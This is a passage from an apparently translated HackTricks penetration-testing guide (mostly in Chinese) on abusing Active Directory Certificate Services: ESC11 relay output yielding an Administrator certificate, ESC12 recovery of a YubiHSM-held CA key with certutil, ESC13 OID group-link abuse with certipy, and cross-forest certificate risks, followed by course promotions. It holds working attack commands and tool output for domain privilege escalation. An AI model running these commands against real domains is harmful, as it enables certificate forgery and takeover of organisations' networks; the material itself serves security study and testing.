[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注意：对于域控制器，我们必须在 DomainController 中指定 `-template`。

或者使用 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

管理员可以设置证书颁发机构，将其存储在外部设备上，如“Yubico YubiHSM2”。

如果USB设备通过USB端口连接到CA服务器，或者在CA服务器是虚拟机的情况下连接到USB设备服务器，则需要一个认证密钥（有时称为“密码”），以便密钥存储提供程序在YubiHSM中生成和使用密钥。

此密钥/密码以明文形式存储在注册表中，路径为`HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`。

参考[这里](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)。

### Abuse Scenario

如果CA的私钥存储在物理USB设备上，当你获得shell访问时，可以恢复该密钥。

首先，你需要获取CA证书（这是公开的），然后：
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最后，使用 certutil `-sign` 命令利用 CA 证书及其私钥伪造一个新的任意证书。

## OID 组链接滥用 - ESC13

### 解释

`msPKI-Certificate-Policy` 属性允许将发行政策添加到证书模板中。负责发行政策的 `msPKI-Enterprise-Oid` 对象可以在 PKI OID 容器的配置命名上下文 (CN=OID,CN=Public Key Services,CN=Services) 中发现。可以使用该对象的 `msDS-OIDToGroupLink` 属性将政策链接到 AD 组，从而使系统能够授权一个用户在呈现证书时仿佛他是该组的成员。[此处参考](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。

换句话说，当用户有权注册证书且该证书链接到 OID 组时，用户可以继承该组的权限。

使用 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) 查找 OIDToGroupLink：
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### 滥用场景

找到一个用户权限，可以使用 `certipy find` 或 `Certify.exe find /showAllPermissions`。

如果 `John` 有权限注册 `VulnerableTemplate`，则该用户可以继承 `VulnerableGroup` 组的权限。

所需的只是指定模板，它将获得具有 OIDToGroupLink 权限的证书。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 用被动语态解释的证书妥协森林

### 被妥协的CA破坏森林信任

**跨森林注册**的配置相对简单。资源森林的**根CA证书**由管理员**发布到账户森林**，资源森林的**企业CA**证书被**添加到每个账户森林中的`NTAuthCertificates`和AIA容器**。为了澄清，这种安排授予资源森林中的**CA对其管理的所有其他森林的完全控制权**。如果该CA被**攻击者妥协**，则资源森林和账户森林中所有用户的证书都可能被**伪造**，从而打破森林的安全边界。

### 授予外部主体的注册权限

在多森林环境中，关于**发布证书模板**的企业CA需要谨慎，这些模板允许**经过身份验证的用户或外部主体**（属于企业CA所在森林的外部用户/组）**注册和编辑权限**。\
在信任关系中进行身份验证后，**经过身份验证的用户SID**会被AD添加到用户的令牌中。因此，如果一个域拥有一个企业CA，其模板**允许经过身份验证的用户注册权限**，则来自不同森林的用户可能会**注册该模板**。同样，如果**模板明确授予外部主体注册权限**，则**跨森林访问控制关系由此创建**，使得一个森林中的主体能够**注册另一个森林中的模板**。

这两种情况都会导致**攻击面从一个森林增加到另一个森林**。攻击者可以利用证书模板的设置在外部域中获得额外权限。

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家(ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家(GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR分享黑客技巧。

</details>
{% endhint %}
